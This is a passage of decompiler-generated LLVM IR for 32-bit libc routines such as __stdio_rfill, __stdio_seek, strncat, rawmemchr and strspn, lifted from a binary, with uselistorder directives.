  br i1 %tmp14, label %dec_label_pc_8053531, label %dec_label_pc_8053533

dec_label_pc_8053531:                             ; preds = %dec_label_pc_805352d, %dec_label_pc_805352b
  %v0_8053531 = load i32, i32* %esi.global-to-local, align 4
  %v1_8053531 = sub i32 0, %v0_8053531
  store i32 %v1_8053531, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8053533

dec_label_pc_8053533:                             ; preds = %dec_label_pc_805352d, %dec_label_pc_80534ee, %dec_label_pc_8053531
  %v0_8053533 = load i32, i32* %esi.global-to-local, align 4
  %v2_8053533 = icmp slt i32 %v0_8053533, 0
  %v1_8053535 = icmp eq i1 %v2_8053533, false
  br i1 %v1_8053535, label %dec_label_pc_8053547, label %dec_label_pc_8053537

dec_label_pc_8053537:                             ; preds = %dec_label_pc_8053533
  %v1_8053537 = call i32 @__errno_location(i32 %v2_8053510)
  %v1_805353c = inttoptr i32 %v1_8053537 to i32*
  store i32 75, i32* %v1_805353c, align 4
  %v0_805354a.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8053547

dec_label_pc_8053544:                             ; preds = %dec_label_pc_80534d3, %dec_label_pc_80534ce
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8053547

dec_label_pc_8053547:                             ; preds = %dec_label_pc_8053533, %dec_label_pc_8053537, %dec_label_pc_8053544
  %v0_805354a = phi i32 [ %v0_8053533, %dec_label_pc_8053533 ], [ %v0_805354a.pre, %dec_label_pc_8053537 ], [ -1, %dec_label_pc_8053544 ]
  ret i32 %v0_805354a

; uselistorder directives
  uselistorder i32 %v4_8053526, { 1, 0 }
  uselistorder i32 %v3_8053526, { 1, 0 }
  uselistorder i32 %v1_80534c6, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v1_80534bf, { 4, 5, 3, 2, 1, 0 }
  uselistorder i32 %v2_80534b8, { 2, 1, 0, 3 }
  uselistorder i32 %tmp6, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32 75, { 1, 0 }
  uselistorder i32 2048, { 2, 1, 6, 3, 5, 0, 8, 4, 7 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8053547, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8053533, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80534ee, { 4, 0, 1, 2, 3 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %v0_8053550 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8053558 = add i32 %arg1, 8
  %v2_8053558 = inttoptr i32 %v1_8053558 to i32*
  %v3_8053558 = load i32, i32* %v2_8053558, align 4
  store i32 %v3_8053558, i32* %edx.global-to-local, align 4
  %v1_805355b = add i32 %arg1, 12
  %v2_805355b = inttoptr i32 %v1_805355b to i32*
  %v3_805355b = load i32, i32* %v2_805355b, align 4
  %v2_805355e = sub i32 %v3_805355b, %v3_8053558
  %v3_8053563 = inttoptr i32 %arg1 to i16*
  %v4_8053563 = call i32 @__stdio_READ(i16* %v3_8053563, i32 %v3_8053558, i32 %v2_805355e)
  %v0_8053568 = load i32, i32* @ebx, align 4
  %v1_8053568 = add i32 %v0_8053568, 8
  %v2_8053568 = inttoptr i32 %v1_8053568 to i32*
  %v3_8053568 = load i32, i32* %v2_8053568, align 4
  store i32 %v3_8053568, i32* %edx.global-to-local, align 4
  %v2_805356b = add i32 %v0_8053568, 16
  %v3_805356b = inttoptr i32 %v2_805356b to i32*
  store i32 %v3_8053568, i32* %v3_805356b, align 4
  %v0_805356e = load i32, i32* %edx.global-to-local, align 4
  %v2_805356e = add i32 %v0_805356e, %v4_8053563
  store i32 %v2_805356e, i32* %edx.global-to-local, align 4
  %v1_8053570 = load i32, i32* @ebx, align 4
  %v2_8053570 = add i32 %v1_8053570, 20
  %v3_8053570 = inttoptr i32 %v2_8053570 to i32*
  store i32 %v2_805356e, i32* %v3_8053570, align 4
  store i32 %v0_8053550, i32* @ebx, align 4
  ret i32 %v4_8053563

; uselistorder directives
  uselistorder i32 %v4_8053563, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
}

define i32 @__stdio_trans2r_o(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8053578 = load i32, i32* @ebx, align 4
  %v4_805357c = ptrtoint i16* %arg1 to i32
  store i32 %v4_805357c, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v1_8053584 = bitcast i16* %arg1 to i32*
  %v2_8053584 = load i32, i32* %v1_8053584, align 4
  %v1_8053586 = urem i32 %v2_8053584, 65536
  %v2_8053589 = and i32 %v1_8053586, %arg2
  %v3_8053589 = icmp eq i32 %v2_8053589, 0
  %v1_805358b = icmp eq i1 %v3_8053589, false
  br i1 %v1_805358b, label %dec_label_pc_805359a, label %dec_label_pc_805358d

dec_label_pc_805358d:                             ; preds = %entry
  %v1_805358d = and i32 %v2_8053584, 2176
  %v2_805358d = icmp eq i32 %v1_805358d, 0
  %v1_8053593 = icmp eq i1 %v2_805358d, false
  br i1 %v1_8053593, label %dec_label_pc_80535a1, label %dec_label_pc_8053595

dec_label_pc_8053595:                             ; preds = %dec_label_pc_805358d
  %v2_8053595 = or i32 %v2_8053584, %arg2
  %v1_8053597 = trunc i32 %v2_8053595 to i16
  store i16 %v1_8053597, i16* %arg1, align 2
  %v0_805359a.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805359a

dec_label_pc_805359a:                             ; preds = %entry, %dec_label_pc_8053595
  %v0_80535bc = phi i32 [ %v4_805357c, %entry ], [ %v0_805359a.pre, %dec_label_pc_8053595 ]
  %v1_805359a = inttoptr i32 %v0_80535bc to i16*
  %v2_805359a = load i16, i16* %v1_805359a, align 2
  %v2_805359d = and i16 %v2_805359a, 16
  %v3_805359d = icmp eq i16 %v2_805359d, 0
  br i1 %v3_805359d, label %dec_label_pc_80535b5, label %dec_label_pc_80535a1

dec_label_pc_80535a1:                             ; preds = %dec_label_pc_805359a, %dec_label_pc_805358d
  %v1_80535a1 = call i32 @__errno_location(i32 %v0_8053578)
  %v1_80535a6 = inttoptr i32 %v1_80535a1 to i32*
  store i32 9, i32* %v1_80535a6, align 4
  br label %dec_label_pc_80535ac

dec_label_pc_80535ac:                             ; preds = %dec_label_pc_80535b9, %dec_label_pc_80535a1
  %v0_80535ac = load i32, i32* @ebx, align 4
  %v1_80535ac = inttoptr i32 %v0_80535ac to i16*
  %v2_80535ac = load i16, i16* %v1_80535ac, align 2
  %v3_80535ac = or i16 %v2_80535ac, 8
  store i16 %v3_80535ac, i16* %v1_80535ac, align 2
  br label %dec_label_pc_80535d9

dec_label_pc_80535b5:                             ; preds = %dec_label_pc_805359a
  %v2_80535b5 = and i16 %v2_805359a, 64
  %v3_80535b5 = icmp eq i16 %v2_80535b5, 0
  br i1 %v3_80535b5, label %dec_label_pc_80535d3, label %dec_label_pc_80535b9

dec_label_pc_80535b9:                             ; preds = %dec_label_pc_80535b5
  %v2_80535bd = call i32 @__stdio_wcommit(i32 %v0_80535bc)
  %v1_80535c5 = icmp eq i32 %v2_80535bd, 0
  %v1_80535c7 = icmp eq i1 %v1_80535c5, false
  br i1 %v1_80535c7, label %dec_label_pc_80535ac, label %dec_label_pc_80535c9

dec_label_pc_80535c9:                             ; preds = %dec_label_pc_80535b9
  %v0_80535c9 = load i32, i32* @ebx, align 4
  %v1_80535c9 = inttoptr i32 %v0_80535c9 to i16*
  %v2_80535c9 = load i16, i16* %v1_80535c9, align 2
  %v3_80535c9 = and i16 %v2_80535c9, -65
  store i16 %v3_80535c9, i16* %v1_80535c9, align 2
  %v0_80535cd = load i32, i32* @ebx, align 4
  %v1_80535cd = add i32 %v0_80535cd, 8
  %v2_80535cd = inttoptr i32 %v1_80535cd to i32*
  %v3_80535cd = load i32, i32* %v2_80535cd, align 4
  %v2_80535d0 = add i32 %v0_80535cd, 28
  %v3_80535d0 = inttoptr i32 %v2_80535d0 to i32*
  store i32 %v3_80535cd, i32* %v3_80535d0, align 4
  %v0_80535d3.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80535d3

dec_label_pc_80535d3:                             ; preds = %dec_label_pc_80535b5, %dec_label_pc_80535c9
  %v9_80535d3 = phi i32 [ %v0_80535bc, %dec_label_pc_80535b5 ], [ %v0_80535d3.pre, %dec_label_pc_80535c9 ]
  %v1_80535d3 = inttoptr i32 %v9_80535d3 to i16*
  %v2_80535d3 = load i16, i16* %v1_80535d3, align 2
  %v3_80535d3 = or i16 %v2_80535d3, 1
  store i16 %v3_80535d3, i16* %v1_80535d3, align 2
  br label %dec_label_pc_80535d9

dec_label_pc_80535d9:                             ; preds = %dec_label_pc_80535ac, %dec_label_pc_80535d3
  %storemerge = phi i32 [ 0, %dec_label_pc_80535d3 ], [ -1, %dec_label_pc_80535ac ]
  store i32 %v0_8053578, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_8053584, { 1, 2, 0 }
  uselistorder i32 %v0_8053578, { 1, 0 }
  uselistorder i16 1, { 1, 2, 0 }
  uselistorder i32 (i32)* @__stdio_wcommit, { 3, 6, 5, 4, 2, 1, 0 }
  uselistorder i16 8, { 3, 4, 0, 1, 5, 2 }
  uselistorder i16 0, { 0, 7, 1, 8, 5, 6, 9, 10, 11, 12, 13, 14, 15, 2, 3, 4 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80535d9, { 1, 0 }
  uselistorder label %dec_label_pc_80535d3, { 1, 0 }
  uselistorder label %dec_label_pc_805359a, { 1, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp5 = ptrtoint i32* %arg2 to i32
  store i32 %tmp5, i32* @ebx, align 4
  %v1_80535ec = add i32 %tmp5, 4
  %v2_80535ec = inttoptr i32 %v1_80535ec to i32*
  %v3_80535ec = load i32, i32* %v2_80535ec, align 4
  %v2_80535ef = load i32, i32* %arg2, align 4
  %v1_80535f5 = add i32 %arg1, 4
  %v2_80535f5 = inttoptr i32 %v1_80535f5 to i32*
  %v3_80535f5 = load i32, i32* %v2_80535f5, align 4
  %v4_80535f8 = call i32 @__libc_lseek64(i32 %v3_80535f5, i32 %v2_80535ef, i32 %v3_80535ec, i32 %arg3)
  %v0_8053602 = load i32, i32* @edx, align 4
  %v2_8053602 = icmp slt i32 %v0_8053602, 0
  br i1 %v2_8053602, label %dec_label_pc_805360d, label %dec_label_pc_8053606

dec_label_pc_8053606:                             ; preds = %entry
  %v1_8053606 = load i32, i32* @ebx, align 4
  %v2_8053606 = inttoptr i32 %v1_8053606 to i32*
  store i32 %v4_80535f8, i32* %v2_8053606, align 4
  %v0_8053608 = load i32, i32* @edx, align 4
  %v1_8053608 = load i32, i32* @ebx, align 4
  %v2_8053608 = add i32 %v1_8053608, 4
  %v3_8053608 = inttoptr i32 %v2_8053608 to i32*
  store i32 %v0_8053608, i32* %v3_8053608, align 4
  br label %dec_label_pc_805360d

dec_label_pc_805360d:                             ; preds = %entry, %dec_label_pc_8053606
  %v0_805360d = phi i32 [ %v4_80535f8, %entry ], [ 0, %dec_label_pc_8053606 ]
  ret i32 %v0_805360d

; uselistorder directives
  uselistorder i32 %tmp5, { 1, 0 }
  uselistorder label %dec_label_pc_805360d, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v4_8053616 = ptrtoint i8* %arg1 to i32
  %v4_805361e.pre = load i32, i32* @eax, align 4
  %v8_805361e.pre = load i1, i1* @df, align 1
  %v9_805361e = select i1 %v8_805361e.pre, i32 -1, i32 1
  br label %dec_label_pc_805361e

dec_label_pc_805361e:                             ; preds = %dec_label_pc_8053622, %entry
  %v20_805361f = phi i32 [ %v23_805361f, %dec_label_pc_8053622 ], [ %arg2, %entry ]
  %v4_805361e = phi i32 [ %v6_805361e, %dec_label_pc_8053622 ], [ %v4_805361e.pre, %entry ]
  %v7_805361e = phi i32 [ %v10_805361e, %dec_label_pc_8053622 ], [ %v4_8053616, %entry ]
  %v1_805361e = inttoptr i32 %v7_805361e to i8*
  %v2_805361e = load i8, i8* %v1_805361e, align 1
  %v3_805361f = inttoptr i32 %v20_805361f to i8*
  %v4_805361f = load i8, i8* %v3_805361f, align 1
  %v15_805361f = icmp eq i8 %v2_805361e, %v4_805361f
  %v1_8053620 = icmp eq i1 %v15_805361f, false
  br i1 %v1_8053620, label %dec_label_pc_805362a, label %dec_label_pc_8053622

dec_label_pc_8053622:                             ; preds = %dec_label_pc_805361e
  %v3_805361e = zext i8 %v2_805361e to i32
  %v5_805361e = and i32 %v4_805361e, -256
  %v6_805361e = or i32 %v3_805361e, %v5_805361e
  %v23_805361f = add i32 %v20_805361f, %v9_805361e
  %v10_805361e = add i32 %v7_805361e, %v9_805361e
  %v4_8053622 = icmp eq i8 %v2_805361e, 0
  %v1_8053624 = icmp eq i1 %v4_8053622, false
  br i1 %v1_8053624, label %dec_label_pc_805361e, label %dec_label_pc_805362e

dec_label_pc_805362a:                             ; preds = %dec_label_pc_805361e
  br label %dec_label_pc_805362e

dec_label_pc_805362e:                             ; preds = %dec_label_pc_8053622, %dec_label_pc_805362a
  %storemerge = phi i32 [ 1, %dec_label_pc_805362a ], [ 0, %dec_label_pc_8053622 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_805361e, { 1, 2, 0 }
  uselistorder i32 %v9_805361e, { 1, 0 }
  uselistorder label %dec_label_pc_805362e, { 1, 0 }
}

define i32 @__GI_strncat() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-8 = alloca i32, align 4
  %v0_8053635 = load i32, i32* @esi, align 4
  store i32 %v0_8053635, i32* %stack_var_-8, align 4
  %v4_8053636 = ptrtoint i8* %tmp5 to i32
  store i32 %v4_8053636, i32* %esi.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v4_8053643 = inttoptr i32 %tmp to i8*
  store i32 %tmp, i32* %edi.global-to-local, align 4
  %v3_8053647 = call i32 @_strlen(i8* %v4_8053643)
  %v2_8053649 = add i32 %tmp, -1
  store i32 %v2_8053649, i32* %edi.global-to-local, align 4
  %v0_805364a = load i32, i32* %edx.global-to-local, align 4
  %v8_805364d10 = icmp eq i32 %v0_805364a, 0
  store i32 %v0_805364a, i32* %ecx.global-to-local, align 4
  br i1 %v8_805364d10, label %dec_label_pc_8053658, label %dec_label_pc_8053650.lr.ph

dec_label_pc_8053650.lr.ph:                       ; preds = %entry
  %v4_8053650.pre = load i32, i32* %eax.global-to-local, align 4
  %v8_8053650.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_8053650

dec_label_pc_8053650:                             ; preds = %dec_label_pc_8053650.lr.ph, %dec_label_pc_8053650.dec_label_pc_805364d_crit_edge
  %v8_8053650 = phi i1 [ %v8_8053650.pre, %dec_label_pc_8053650.lr.ph ], [ %v5_8053651, %dec_label_pc_8053650.dec_label_pc_805364d_crit_edge ]
  %v4_8053650 = phi i32 [ %v4_8053650.pre, %dec_label_pc_8053650.lr.ph ], [ %v0_8053652, %dec_label_pc_8053650.dec_label_pc_805364d_crit_edge ]
  %v2_805365a11 = phi i32 [ %v2_8053649, %dec_label_pc_8053650.lr.ph ], [ %v7_8053651, %dec_label_pc_8053650.dec_label_pc_805364d_crit_edge ]
  %v0_8053650 = load i32, i32* %esi.global-to-local, align 4
  %v1_8053650 = inttoptr i32 %v0_8053650 to i8*
  %v2_8053650 = load i8, i8* %v1_8053650, align 1
  %v3_8053650 = zext i8 %v2_8053650 to i32
  %v5_8053650 = and i32 %v4_8053650, -256
  %v6_8053650 = or i32 %v5_8053650, %v3_8053650
  store i32 %v6_8053650, i32* %eax.global-to-local, align 4
  %v9_8053650 = select i1 %v8_8053650, i32 -1, i32 1
  %v10_8053650 = add i32 %v9_8053650, %v0_8053650
  store i32 %v10_8053650, i32* %esi.global-to-local, align 4
  %v3_8053651 = inttoptr i32 %v2_805365a11 to i8*
  store i8 %v2_8053650, i8* %v3_8053651, align 1
  %v4_8053651 = load i32, i32* %edi.global-to-local, align 4
  %v5_8053651 = load i1, i1* @df, align 1
  %v6_8053651 = select i1 %v5_8053651, i32 -1, i32 1
  %v7_8053651 = add i32 %v6_8053651, %v4_8053651
  store i32 %v7_8053651, i32* %edi.global-to-local, align 4
  %v0_8053652 = load i32, i32* %eax.global-to-local, align 4
  %v3_8053652 = trunc i32 %v0_8053652 to i8
  %v4_8053652 = icmp eq i8 %v3_8053652, 0
  %v1_8053654 = icmp eq i1 %v4_8053652, false
  br i1 %v1_8053654, label %dec_label_pc_8053650.dec_label_pc_805364d_crit_edge, label %dec_label_pc_805365b

dec_label_pc_8053650.dec_label_pc_805364d_crit_edge: ; preds = %dec_label_pc_8053650
  %v0_805364d.pre = load i32, i32* %ecx.global-to-local, align 4
  %v1_805364d = add i32 %v0_805364d.pre, -1
  %v8_805364d = icmp eq i32 %v1_805364d, 0
  store i32 %v1_805364d, i32* %ecx.global-to-local, align 4
  br i1 %v8_805364d, label %dec_label_pc_8053658, label %dec_label_pc_8053650

dec_label_pc_8053658:                             ; preds = %dec_label_pc_8053650.dec_label_pc_805364d_crit_edge, %entry
  %v2_805365a.lcssa = phi i32 [ %v2_8053649, %entry ], [ %v7_8053651, %dec_label_pc_8053650.dec_label_pc_805364d_crit_edge ]
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_805365a = inttoptr i32 %v2_805365a.lcssa to i8*
  store i8 0, i8* %v3_805365a, align 1
  %v4_805365a = load i32, i32* %edi.global-to-local, align 4
  %v5_805365a = load i1, i1* @df, align 1
  %v6_805365a = select i1 %v5_805365a, i32 -1, i32 1
  %v7_805365a = add i32 %v6_805365a, %v4_805365a
  store i32 %v7_805365a, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805365b

dec_label_pc_805365b:                             ; preds = %dec_label_pc_8053650, %dec_label_pc_8053658
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v2_805365f = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805365f, i32* @esi, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v1_805364d, { 1, 0 }
  uselistorder i32 %v0_8053652, { 1, 0 }
  uselistorder i32 %v7_8053651, { 0, 2, 1 }
  uselistorder i1 %v5_8053651, { 1, 0 }
  uselistorder i32 %tmp, { 4, 3, 0, 1, 2 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_805365b, { 1, 0 }
  uselistorder label %dec_label_pc_8053650, { 1, 0 }
}

define i32 @rawmemchr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8053665 = load i32, i32* @ebx, align 4
  %v4_8053666 = urem i32 %arg2, 256
  %v4_805366a = ptrtoint i8* %arg1 to i32
  %v2_80536753 = urem i32 %v4_805366a, 4
  %v3_80536754 = icmp eq i32 %v2_80536753, 0
  %v1_80536778 = icmp eq i1 %v3_80536754, false
  %v4_8053670 = trunc i32 %arg2 to i8
  br i1 %v1_80536778, label %dec_label_pc_8053670, label %dec_label_pc_8053679

dec_label_pc_8053670:                             ; preds = %entry, %dec_label_pc_8053674
  %v0_8053674 = phi i32 [ %v1_8053674, %dec_label_pc_8053674 ], [ %v4_805366a, %entry ]
  %v1_8053670 = inttoptr i32 %v0_8053674 to i8*
  %v2_8053670 = load i8, i8* %v1_8053670, align 1
  %v15_8053670 = icmp eq i8 %v2_8053670, %v4_8053670
  br i1 %v15_8053670, label %dec_label_pc_80536c4, label %dec_label_pc_8053674

dec_label_pc_8053674:                             ; preds = %dec_label_pc_8053670
  %v1_8053674 = add i32 %v0_8053674, 1
  %v2_8053675 = urem i32 %v1_8053674, 4
  %v3_8053675 = icmp eq i32 %v2_8053675, 0
  %v1_8053677 = icmp eq i1 %v3_8053675, false
  br i1 %v1_8053677, label %dec_label_pc_8053670, label %dec_label_pc_8053679

dec_label_pc_8053679:                             ; preds = %entry, %dec_label_pc_8053674
  %v0_805367c = phi i32 [ %v1_8053674, %dec_label_pc_8053674 ], [ %v4_805366a, %entry ]
  %v2_8053680 = mul nuw nsw i32 %v4_8053666, 256
  %v2_8053683 = or i32 %v2_8053680, %v4_8053666
  %v2_8053687 = mul i32 %v2_8053683, 65536
  %v2_805368a = or i32 %v2_8053687, %v2_8053683
  br label %dec_label_pc_805368c

dec_label_pc_805368c:                             ; preds = %dec_label_pc_80536bc, %dec_label_pc_805368c, %dec_label_pc_8053679
  %v0_8053690 = phi i32 [ %v0_805367c, %dec_label_pc_8053679 ], [ %v1_8053690, %dec_label_pc_805368c ], [ %v1_8053690, %dec_label_pc_80536bc ]
  %v2_805368e = inttoptr i32 %v0_8053690 to i32*
  %v3_805368e = load i32, i32* %v2_805368e, align 4
  %v4_805368e = xor i32 %v3_805368e, %v2_805368a
  %v1_8053690 = add i32 %v0_8053690, 4
  store i32 %v1_8053690, i32* @ecx, align 4
  %v1_8053693 = add i32 %v4_805368e, 2130640639
  %v1_8053699 = sub i32 -1, %v4_805368e
  store i32 %v1_8053699, i32* @edx, align 4
  %v2_805369b = xor i32 %v1_8053693, %v1_8053699
  %v1_805369d = and i32 %v2_805369b, -2130640640
  %v2_805369d = icmp eq i32 %v1_805369d, 0
  br i1 %v2_805369d, label %dec_label_pc_805368c, label %dec_label_pc_80536a4

dec_label_pc_80536a4:                             ; preds = %dec_label_pc_805368c
  %v2_80536a7 = inttoptr i32 %v0_8053690 to i8*
  %v3_80536a7 = load i8, i8* %v2_80536a7, align 1
  %v16_80536a7 = icmp eq i8 %v3_80536a7, %v4_8053670
  br i1 %v16_80536a7, label %dec_label_pc_80536c4, label %dec_label_pc_80536ac

dec_label_pc_80536ac:                             ; preds = %dec_label_pc_80536a4
  %v1_80536ac = add i32 %v0_8053690, 1
  %v2_80536af = inttoptr i32 %v1_80536ac to i8*
  %v3_80536af = load i8, i8* %v2_80536af, align 1
  %v16_80536af = icmp eq i8 %v3_80536af, %v4_8053670
  br i1 %v16_80536af, label %dec_label_pc_80536c4, label %dec_label_pc_80536b4

dec_label_pc_80536b4:                             ; preds = %dec_label_pc_80536ac
  %v1_80536b4 = add i32 %v0_8053690, 2
  %v2_80536b7 = inttoptr i32 %v1_80536b4 to i8*
  %v3_80536b7 = load i8, i8* %v2_80536b7, align 1
  %v16_80536b7 = icmp eq i8 %v3_80536b7, %v4_8053670
  br i1 %v16_80536b7, label %dec_label_pc_80536c4, label %dec_label_pc_80536bc

dec_label_pc_80536bc:                             ; preds = %dec_label_pc_80536b4
  %v1_80536bc = add i32 %v0_8053690, 3
  %v2_80536bf = inttoptr i32 %v1_80536bc to i8*
  %v3_80536bf = load i8, i8* %v2_80536bf, align 1
  %v16_80536bf = icmp eq i8 %v3_80536bf, %v4_8053670
  %v1_80536c2 = icmp eq i1 %v16_80536bf, false
  br i1 %v1_80536c2, label %dec_label_pc_805368c, label %dec_label_pc_80536c4

dec_label_pc_80536c4:                             ; preds = %dec_label_pc_8053670, %dec_label_pc_80536bc, %dec_label_pc_80536b4, %dec_label_pc_80536ac, %dec_label_pc_80536a4
  %v0_80536c6 = phi i32 [ %v1_80536bc, %dec_label_pc_80536bc ], [ %v1_80536b4, %dec_label_pc_80536b4 ], [ %v1_80536ac, %dec_label_pc_80536ac ], [ %v0_8053690, %dec_label_pc_80536a4 ], [ %v0_8053674, %dec_label_pc_8053670 ]
  store i32 %v0_8053665, i32* @ebx, align 4
  ret i32 %v0_80536c6

; uselistorder directives
  uselistorder i32 %v1_8053699, { 1, 0 }
  uselistorder i32 %v1_8053690, { 2, 1, 0 }
  uselistorder i32 %v2_8053683, { 1, 0 }
  uselistorder i32 %v1_8053674, { 1, 0, 2 }
  uselistorder i32 %v4_805366a, { 2, 1, 0 }
  uselistorder i32 %v4_8053666, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_80536c4, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_8053679, { 1, 0 }
  uselistorder label %dec_label_pc_8053670, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_80536ea30 = load i8, i8* %arg1, align 1
  %v4_80536ec34 = icmp eq i8 %v2_80536ea30, 0
  br i1 %v4_80536ec34, label %dec_label_pc_80536f4, label %dec_label_pc_80536f0.lr.ph

dec_label_pc_80536f0.lr.ph:                       ; preds = %entry
  %v3_80536ea31 = zext i8 %v2_80536ea30 to i32
  %v4_80536ea.pre = load i32, i32* @eax, align 4
  %v5_80536ea32 = and i32 %v4_80536ea.pre, -256
  %v6_80536ea33 = or i32 %v3_80536ea31, %v5_80536ea32
  %v4_80536d1 = ptrtoint i8* %arg1 to i32
  %v1_80536dc18 = inttoptr i32 %arg2 to i8*
  %v4_80536dc.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_80536f0

dec_label_pc_80536d7:                             ; preds = %dec_label_pc_80536f0, %dec_label_pc_80536db
  %v6_80536dc27 = phi i32 [ %v6_80536dc, %dec_label_pc_80536db ], [ %v6_80536dc22, %dec_label_pc_80536f0 ]
  %v2_80536dc26 = phi i8 [ %v2_80536dc, %dec_label_pc_80536db ], [ %v2_80536dc19, %dec_label_pc_80536f0 ]
  %v0_80536db25 = phi i32 [ %v1_80536db, %dec_label_pc_80536db ], [ %arg2, %dec_label_pc_80536f0 ]
  %v15_80536d7 = icmp eq i8 %v2_80536ea37, %v2_80536dc26
  br i1 %v15_80536d7, label %dec_label_pc_80536e4, label %dec_label_pc_80536db

dec_label_pc_80536db:                             ; preds = %dec_label_pc_80536d7
  %v1_80536db = add i32 %v0_80536db25, 1
  store i32 %v1_80536db, i32* @edx, align 4
  %v1_80536dc = inttoptr i32 %v1_80536db to i8*
  %v2_80536dc = load i8, i8* %v1_80536dc, align 1
  %v3_80536dc = zext i8 %v2_80536dc to i32
  %v5_80536dc = and i32 %v6_80536dc27, -256
  %v6_80536dc = or i32 %v3_80536dc, %v5_80536dc
  store i32 %v6_80536dc, i32* @ecx, align 4
  %v4_80536de = icmp eq i8 %v2_80536dc, 0
  %v1_80536e0 = icmp eq i1 %v4_80536de, false
  br i1 %v1_80536e0, label %dec_label_pc_80536d7, label %dec_label_pc_80536f4

dec_label_pc_80536e4:                             ; preds = %dec_label_pc_80536d7
  %v1_80536e8 = add i32 %v0_80536f435, 1
  %v1_80536e9 = add i32 %v0_80536e936, 1
  %v1_80536ea = inttoptr i32 %v1_80536e9 to i8*
  %v2_80536ea = load i8, i8* %v1_80536ea, align 1
  %v3_80536ea = zext i8 %v2_80536ea to i32
  %v5_80536ea = and i32 %v6_80536ea38, -256
  %v6_80536ea = or i32 %v3_80536ea, %v5_80536ea
  %v4_80536ec = icmp eq i8 %v2_80536ea, 0
  br i1 %v4_80536ec, label %dec_label_pc_80536f4, label %dec_label_pc_80536f0

dec_label_pc_80536f0:                             ; preds = %dec_label_pc_80536f0.lr.ph, %dec_label_pc_80536e4
  %v4_80536dc.pre = phi i32 [ %v4_80536dc.pre.pre, %dec_label_pc_80536f0.lr.ph ], [ %v6_80536dc27, %dec_label_pc_80536e4 ]
  %v6_80536ea38 = phi i32 [ %v6_80536ea33, %dec_label_pc_80536f0.lr.ph ], [ %v6_80536ea, %dec_label_pc_80536e4 ]
  %v2_80536ea37 = phi i8 [ %v2_80536ea30, %dec_label_pc_80536f0.lr.ph ], [ %v2_80536ea, %dec_label_pc_80536e4 ]
  %v0_80536e936 = phi i32 [ %v4_80536d1, %dec_label_pc_80536f0.lr.ph ], [ %v1_80536e9, %dec_label_pc_80536e4 ]
  %v0_80536f435 = phi i32 [ 0, %dec_label_pc_80536f0.lr.ph ], [ %v1_80536e8, %dec_label_pc_80536e4 ]
  store i32 %arg2, i32* @edx, align 4
  %v2_80536dc19 = load i8, i8* %v1_80536dc18, align 1
  %v3_80536dc20 = zext i8 %v2_80536dc19 to i32
  %v5_80536dc21 = and i32 %v4_80536dc.pre, -256
  %v6_80536dc22 = or i32 %v3_80536dc20, %v5_80536dc21
  store i32 %v6_80536dc22, i32* @ecx, align 4
  %v4_80536de23 = icmp eq i8 %v2_80536dc19, 0
  %v1_80536e024 = icmp eq i1 %v4_80536de23, false
  br i1 %v1_80536e024, label %dec_label_pc_80536d7, label %dec_label_pc_80536f4

dec_label_pc_80536f4:                             ; preds = %entry, %dec_label_pc_80536e4, %dec_label_pc_80536f0, %dec_label_pc_80536db
  %v0_80536f417 = phi i32 [ %v0_80536f435, %dec_label_pc_80536db ], [ %v0_80536f435, %dec_label_pc_80536f0 ], [ 0, %entry ], [ %v1_80536e8, %dec_label_pc_80536e4 ]
  ret i32 %v0_80536f417

; uselistorder directives
  uselistorder i32 %v6_80536dc22, { 1, 0 }
  uselistorder i8 %v2_80536dc19, { 1, 2, 0 }
  uselistorder i32 %v1_80536e9, { 1, 0 }
  uselistorder i32 %v6_80536dc, { 1, 0 }
